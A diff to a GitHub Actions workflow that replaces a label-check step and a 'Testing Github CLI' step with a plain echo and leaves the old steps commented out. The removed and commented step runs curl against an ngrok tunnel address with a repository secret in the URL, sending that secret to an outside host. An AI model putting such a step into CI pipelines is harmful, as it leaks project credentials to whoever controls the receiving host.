@@ -19,11 +19,13 @@ jobs:
           - stage
           - prod
     steps:
-      - name: PR Label Check
-        uses: docker://agilepathway/pull-request-label-checker:latest
-        with:
-          one_of: release:major,release:minor,release:patch
-          repo_token: ${{ secrets.GITHUB_TOKEN }}
-      - name: Testing Github CLI
-        run: |
-          curl https://793f-49-36-65-203.in.ngrok.io/test/${{ secrets.ARG }}
+      - name: Testing
+        run: echo "Testing"
+#       - name: PR Label Check
+#         uses: docker://agilepathway/pull-request-label-checker:latest
+#         with:
+#           one_of: release:major,release:minor,release:patch
+#           repo_token: ${{ secrets.GITHUB_TOKEN }}
+#       - name: Testing Github CLI
+#         run: |
+#           curl https://793f-49-36-65-203.in.ngrok.io/test/${{ secrets.ARG }}
